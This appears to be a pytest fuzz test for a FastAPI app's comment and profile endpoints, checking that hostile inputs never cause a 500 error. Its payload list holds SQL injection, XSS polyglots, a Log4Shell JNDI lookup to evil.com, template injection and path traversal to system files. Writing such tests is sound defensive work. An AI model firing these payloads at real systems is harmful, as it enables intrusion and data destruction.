import random
import string
import time
from fastapi.testclient import TestClient

FUZZ_PAYLOADS = [
    "",
    "A" * 1000,
    "A" * 10000,
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "\" OR \"\"=\"",
    "<script>alert(1)</script>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "%s%s%s%s%s%n",
    "\x00\x01\x02\x03\x04\x05",
    "../" * 20 + "etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "",
    "\ufeff\u200b\u200c\u200d",
]

def test_input_boundary_fuzzing(client: TestClient):
    suffix = int(time.time() * 1000)
    username = f"fuzzuser_{suffix}"
    client.post("/api/v1/auth/register", json={
        "username": username,
        "email": f"{username}@test.com",
        "password": "Password123!"
    })
    token = client.post("/api/v1/auth/login", json={
        "username": username,
        "password": "Password123!"
    }).json()["access_token"]

    # Fuzz Comment Endpoint
    for payload in FUZZ_PAYLOADS:
        resp = client.post(
            "/api/v1/posts/1/comments",
            headers={"Authorization": f"Bearer {token}"},
            json={"comment_text": payload}
        )
        # Endpoint should gracefully validate or process, never return unhandled 500 error
        assert resp.status_code in [200, 201, 400, 404, 422], f"Fuzz payload triggered unexpected status: {resp.status_code} for payload: {payload[:20]}"

    # Fuzz Profile Update Endpoint
    for payload in FUZZ_PAYLOADS:
        resp = client.put(
            "/api/v1/users/me",
            headers={"Authorization": f"Bearer {token}"},
            json={"bio": payload, "full_name": payload[:50]}
        )
        assert resp.status_code in [200, 400, 422], f"Fuzz payload triggered unexpected status: {resp.status_code}"
